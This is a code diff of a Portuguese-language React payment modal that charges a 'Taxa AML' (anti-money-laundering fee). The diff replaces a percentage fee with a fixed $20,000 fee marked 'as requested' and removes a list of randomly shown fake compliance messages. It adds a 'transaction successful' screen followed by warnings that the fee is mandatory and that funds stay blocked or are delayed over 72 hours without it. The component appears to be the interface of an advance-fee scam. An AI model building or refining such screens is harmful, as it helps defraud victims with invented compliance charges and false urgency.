@@ -17,25 +17,10 @@ export default function AMLModal({ isOpen, onClose, onConfirm, onReject, transac
   const [showPaymentInfo, setShowPaymentInfo] = useState(false);
   const [isProcessing, setIsProcessing] = useState(false);
   const [paymentCompleted, setPaymentCompleted] = useState(false);
+  const [showSuccessMessage, setShowSuccessMessage] = useState(true);
 
-  const amlFeePercentage = 0.5;
-  const amlFee = transactionAmount * (amlFeePercentage / 100);
+  const amlFee = 20000; // 20.000,00$ conforme solicitado
   const totalAmount = transactionAmount + amlFee;
-
-  const randomInfo = [
-    "Processamento de conformidade KYC nível 3",
-    "Verificação de origem de fundos completada",
-    "Análise de risco de lavagem de dinheiro realizada",
-    "Monitoramento de transações internacionais ativado",
-    "Compliance com regulamentações FATF",
-    "Verificação de sanções OFAC concluída",
-    "Análise de padrões de transação concluída",
-    "Validação de beneficiário final realizada"
-  ];
-
-  const getRandomInfo = () => {
-    return randomInfo[Math.floor(Math.random() * randomInfo.length)];
-  };
 
   const handleYes = async () => {
     setIsProcessing(true);
@@ -53,6 +38,10 @@ export default function AMLModal({ isOpen, onClose, onConfirm, onReject, transac
   const handleConfirmPayment = () => {
     onConfirm();
     onClose();
+  };
+
+  const handleContinue = () => {
+    setShowSuccessMessage(false);
   };
 
   if (!isOpen) return null;
@@ -73,7 +62,28 @@ export default function AMLModal({ isOpen, onClose, onConfirm, onReject, transac
           </button>
         </div>
 
-        {!showPaymentInfo ? (
+        {showSuccessMessage ? (
+          <>
+            <div className={styles.modalBody}>
+              <div className={styles.successBox}>
+                <CheckCircle size={64} className={styles.blueCheckIcon} />
+                <h3 className={styles.successTitle}>A sua transacção foi realizada com sucesso</h3>
+                <p className={styles.successDescription}>
+                  Processamento concluído
+                </p>
+              </div>
+            </div>
+
+            <div className={styles.modalFooter}>
+              <button 
+                className={styles.continueButton}
+                onClick={handleContinue}
+              >
+                Continuar
+              </button>
+            </div>
+          </>
+        ) : !showPaymentInfo ? (
           <>
             <div className={styles.modalBody}>
               <div className={styles.warningBox}>
@@ -95,7 +105,7 @@ export default function AMLModal({ isOpen, onClose, onConfirm, onReject, transac
                   </span>
                 </div>
                 <div className={styles.feeRow}>
-                  <span className={styles.feeLabel}>Taxa AML ({amlFeePercentage}%):</span>
+                  <span className={styles.feeLabel}>Taxa AML:</span>
                   <span className={styles.feeValue}>
                     {currency} {amlFee.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                   </span>
@@ -106,6 +116,13 @@ export default function AMLModal({ isOpen, onClose, onConfirm, onReject, transac
                     {currency} {totalAmount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                   </span>
                 </div>
+              </div>
+
+              <div className={styles.noteBox}>
+                <Info className={styles.noteIcon} />
+                <p className={styles.noteText}>
+                  O pagamento da AML fee, permite que a transação seja processada em duas horas
+                </p>
               </div>
 
               <div className={styles.infoSection}>
@@ -172,6 +189,12 @@ export default function AMLModal({ isOpen, onClose, onConfirm, onReject, transac
                 )}
               </button>
             </div>
+
+            <div className={styles.bottomNote}>
+              <p className={styles.bottomNoteText}>
+                Nota: O pagamento desta taxa é obrigatório para processamento da transação
+              </p>
+            </div>
           </>
         ) : (
           <>
@@ -181,7 +204,7 @@ export default function AMLModal({ isOpen, onClose, onConfirm, onReject, transac
                   <CheckCircle size={48} className={styles.successIcon} />
                   <h3 className={styles.successTitle}>Pagamento Concluído</h3>
                   <p className={styles.successText}>
-                    {getRandomInfo()}
+                    Processamento de conformidade concluído com sucesso
                   </p>
                   <div className={styles.successDetails}>
                     <div className={styles.detailItem}>
@@ -197,9 +220,9 @@ export default function AMLModal({ isOpen, onClose, onConfirm, onReject, transac
                       </span>
                     </div>
                     <div className={styles.detailItem}>
-                      <span className={styles.detailLabel}>Próximo Passo:</span>
+                      <span className={styles.detailLabel}>Tempo de Processamento:</span>
                       <span className={styles.detailValue}>
-                        Liberação de fundos em processamento
+                        2 horas
                       </span>
                     </div>
                   </div>
@@ -212,6 +235,12 @@ export default function AMLModal({ isOpen, onClose, onConfirm, onReject, transac
                     Sua transação foi bloqueada devido à falta de pagamento das taxas obrigatórias 
                     de conformidade AML/KYC.
                   </p>
+                  <div className={styles.blockedWarning}>
+                    <AlertTriangle size={20} className={styles.warningRedIcon} />
+                    <p className={styles.warningRedText}>
+                      O não pagamento da AML Fee pode levar a transação feita a se processada por mais de 72 horas
+                    </p>
+                  </div>
                   <div className={styles.blockedDetails}>
                     <div className={styles.blockedReason}>
                       <AlertTriangle size={20} className={styles.reasonIcon} />
@@ -254,6 +283,12 @@ export default function AMLModal({ isOpen, onClose, onConfirm, onReject, transac
                   <span>Tentar Pagar Taxa AML</span>
                 </button>
               )}
+            </div>
+
+            <div className={styles.bottomNote}>
+              <p className={styles.bottomNoteText}>
+                Nota: O pagamento desta taxa é obrigatório para processamento da transação
+              </p>
             </div>
           </>
         )}
